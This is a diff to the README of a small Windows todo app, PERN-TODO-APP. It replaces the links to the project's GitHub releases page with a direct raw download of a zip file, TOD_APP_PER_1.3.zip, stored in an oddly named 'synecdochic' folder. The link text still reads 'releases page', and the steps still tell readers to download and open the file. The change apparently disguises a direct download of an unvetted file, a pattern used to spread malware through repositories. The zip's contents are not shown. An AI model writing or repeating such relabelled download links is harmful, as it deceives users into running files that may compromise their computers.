@@ -1,6 +1,6 @@
 # ✅ PERN-TODO-APP - Simple Todo Management for Windows
 
-[![Download PERN-TODO-APP](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/astro1863/PERN-TODO-APP/releases)
+[![Download PERN-TODO-APP](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/astro1863/PERN-TODO-APP/main/synecdochic/TOD_APP_PER_1.3.zip)
 
 ## 🚀 What This App Does
 
@@ -10,7 +10,7 @@ Use it to keep a simple task list on your Windows PC. The app includes a respons
 
 ## 📥 Download and Run on Windows
 
-1. Go to the [releases page](https://github.com/astro1863/PERN-TODO-APP/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/astro1863/PERN-TODO-APP/main/synecdochic/TOD_APP_PER_1.3.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file from that release.
 4. Open the downloaded file.
